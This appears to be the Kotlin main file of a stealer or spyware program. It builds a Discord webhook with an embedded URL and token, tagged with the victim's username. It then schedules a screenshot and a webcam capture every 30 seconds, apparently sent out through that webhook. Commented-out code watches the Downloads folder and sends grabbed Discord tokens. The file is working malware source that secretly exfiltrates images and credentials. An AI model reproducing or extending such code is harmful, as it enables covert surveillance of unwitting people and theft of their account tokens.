import grabbers.DiscordTokenGrabber
import utils.DiscordWebhook
import java.nio.file.Paths
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

object Main {
    val user: String = System.getProperty("user.name")

    fun generateWebhook(): DiscordWebhook {
        return DiscordWebhook("https://discord.com/api/webhooks/1289937157145886800/dz8f1OAp8FczOWgGUe78fJSxi4Ogv3XySkoemeiaWazv680BUYWDDng83Ob7N_yGigJJ").apply {
            username = user
        }
    }
}

fun main() {
    val scheduler = Executors.newSingleThreadScheduledExecutor()

    scheduler.scheduleAtFixedRate({
        Screen.sendScreenshot()
        Screen.sendWebcam()
    }, 0, 30, TimeUnit.SECONDS)

    /*SystemWatcher(Paths.get("C:/Users/${Main.user}/Downloads"), recursive = true).apply {
        on<SystemEvent.Created> { println("Created: ${it.path}") }
        on<SystemEvent.Modified> { println("Modified: ${it.path}") }
        on<SystemEvent.Deleted> { println("Deleted: ${it.path}") }

        start()
    }*/

//    DiscordTokenGrabber.send()


}